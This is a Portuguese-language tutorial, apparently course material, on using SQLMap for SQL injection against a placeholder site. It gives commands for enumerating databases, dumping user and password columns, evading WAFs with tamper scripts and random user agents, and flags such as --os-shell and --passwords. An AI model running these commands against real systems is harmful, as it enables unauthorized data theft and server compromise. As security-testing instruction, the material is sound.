<div align="center">
  <img src="https://cdn.cyberpunk.rs/wp-content/uploads/2018/08/sqlmap_bg2.jpg" alt="Ffuf" width="600"/>
</div>

➡️ [Fonte principal](https://portswigger.net/web-security/sql-injection#subverting-application-logic)  
➡️ [PDF da Aula](./pdf/sql_injection.pdf) desenvolvido por [@GJSegatto](https://github.com/GJSegatto)

---
# SQLMap    

O SQLMap é uma ferramenta automatizada de framework aberto que detecta e explora injeções SQL através de força bruta inteligente e inferência avançada.

## Vantagens e Desvantagens da Automação

| ** Vantagens**                                                                                            | **Desvantagens**                                                                                                    |
| --------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| Identifica e explora quase todos os principais SGBDs nativamente (MySQL, PostgreSQL, Oracle, MSSQL, etc). | Ferramentas automatizadas geram grandes volumes de tráfego, sendo facilmente detectadas por SOCs                    |
| Realiza a exfiltração de dados caractere por caractere, o que seria inviável manualmente.                 | Requisições padronizadas com assinaturas conhecidas são rapidamente mitigadas por WAFs (Web Application Firewalls). |
| Permite testes simultâneos em parâmetros de URL, formulários POST, _Cookies_ e cabeçalhos HTTP.           | Pode falhar em rotas de aplicação não padronizadas, exigindo sintonia fina das _flags_ de configuração.             |

## Casos de Uso

O fluxo básico de trabalho da ferramenta respeita a hierarquia do SGBD: Enumeração de Bancos -> Tabelas -> Colunas -> _Dump_ de Dados.

**1. Enumeração Básica -> Método GET**

Verifica os bancos de dados disponíveis a partir de um parâmetro de URL.

Bash

```
sqlmap -u "http://alvo.com/pagina.php?id=1" --dbs --batch
```

_O parâmetro `--batch` automatiza as escolhas de fluxo da ferramenta, utilizando o comportamento padrão sem exigir interação do operador._

**2. Ataque em Formulários de Login -> Método POST**

Realiza o _parsing_ da página web, localizando tags HTML `<form>` e injetando vetores diretamente nos campos de entrada ocultos.

Bash

```
sqlmap -u "http://alvo.com/login.php" --forms --crawl=1 --dump
```

_A configuração `--crawl=1` instrui a de rede interna a buscar alvos adjacentes na mesma página de origem._

**3. Injeções via Arquivo Raw -> Requisição HTTP Bruta**

Para alvos onde a injeção ocorre em cabeçalhos (_User-Agent_ ou _Cookies_) ou em requisições contendo JSON, é possível salvar a requisição interceptada, via Burp Suite, em um arquivo de texto.

Bash

```
sqlmap -r requisicao_interceptada.txt -p "id_usuario"
```

_O argumento `-p` força o foco da ferramenta em um único parâmetro, economizando tempo de processamento._

**4. Extração de Dados -> Dump**

Após mapear a arquitetura, executa-se o _download_ dos dados específicos, visando informações críticas.

Bash

```
sqlmap -u "http://alvo.com/pagina.php?id=1" -D corporativo -T usuarios -C username,password --dump --start=1 --stop=10
```

_Os controles `--start` e `--stop` limitam a extração a um intervalo de linhas, evitando sobrecarga ou demora excessiva em tabelas gigantescas._

**5. Evasão de WAF e Ajuste de Agressividade**

Quando as requisições padrão são bloqueadas, faz-se necessário ofuscar os comandos e aumentar a intensidade das varreduras.

Bash

```
sqlmap -u "http://alvo.com/busca.php?q=teste" --tamper=space2comment --random-agent --level=3 --risk=2
```

**6. Modo Wizard**

Para operadores iniciantes, a ferramenta disponibiliza uma interface assistida que formula as consultas através de um questionário em linha de comando.

Bash

```
sqlmap --wizard
```

## 4. Principais Flags do SQLMap

Abaixo, encontra-se o detalhamento das _flags_ essenciais para operação:

### Alvo e Requisição

- **`-u [URL]`** ou **`--url=[URL]`**: Especifica a URL a ser analisada.
    
- **`-p [parâmetro]`**: Restringe o escopo de teste unicamente ao parâmetro definido.
    
- **`--data="user=a&pass=b"`**: Converte automaticamente a requisição para o método `POST`, injetando os dados no corpo do tráfego.
    
- **`-r [arquivo.txt]`**: Define como alvo uma requisição HTTP integral a partir de um arquivo local.
    

### Enumeração e Extração

- **`--dbs`**: Lista todos os bancos de dados disponíveis.
    
- **`--tables`**: Enumera as tabelas de um banco de dados, requer a declaração do banco alvo com `-D`.
    
- **`--columns`**: Enumera as colunas de uma tabela, requer a declaração da tabela com `-T`.
    
- **`--dump`**: Inicia o processo de download e salvamento das informações requeridas.
    
- **`--passwords`**: Enumera os usuários do banco de dados, recupera as _hashes_ de suas respectivas senhas e disponibiliza a opção de tentativa de _cracking_ local.
    

### Evasão de Defesas

- **`--level=[1-5]`**: Ajusta a profundidade e abrangência dos testes (Padrão: 1). 
	- Níveis a partir do 2 englobam testes no cabeçalho _Cookie_; níveis superiores cobrem _User-Agent_ e _Referer_.
    
- **`--risk=[1-3]`**: Configura o perigo potencial dos _payloads_ (Padrão: 1). 
	- Risco 2 adiciona comandos pesados baseados em tempo; 
	- Risco 3 insere vetores baseados no operador `OR`.
    
- **`--tamper=[script]`**: Invoca rotinas de ofuscação para alterar a estrutura do _payload_ original, evadindo assinaturas de WAFs
    
- **`--random-agent`**: Utiliza cabeçalhos _User-Agent_ verossímeis em rotação, ocultando a identificação padrão do SQLMap.
    
- **`--technique=[BEUST]`**: Limita a exploração a uma ou mais técnicas específicas 
	- B = Boolean; E = Error; U = Union; S = Stacked; T = Time
    
- **`--os-shell`**: Usuário possui privilégios máximos e o SGBD dispõe de suporte a acesso de arquivos, permite a instauração de um terminal interativo com o sistema operacional do servidor.

### Mais algumas flags

- **`--current-db:`** Exibe qual banco de dados a aplicação está usando no momento.

- **`--current-user:`** Mostra o usuário do banco de dados executando a query.

- **`--is-dba:`** Verifica se o usuário atual tem privilégios máximos.

- **`-D [banco] --tables:`** Lista as tabelas de um banco de dados específico.

- **`-D [banco] -T [tabela] --columns:`** Lista as colunas de uma tabela específica.

- **`-D [banco] -T [tabela] -C [col1,col2] --dump:`** Extrai os dados reais daquelas colunas.

- **`--dump-all:`** Extrai absolutamente tudo.

- **`--count:`** Exibe apenas a quantidade de linhas em uma tabela, sem baixar os dados. Útil para saber o tamanho do estrago.

- **`--start=1 --stop=10:`** Combinado com o --dump, extrai apenas um intervalo de linhas.
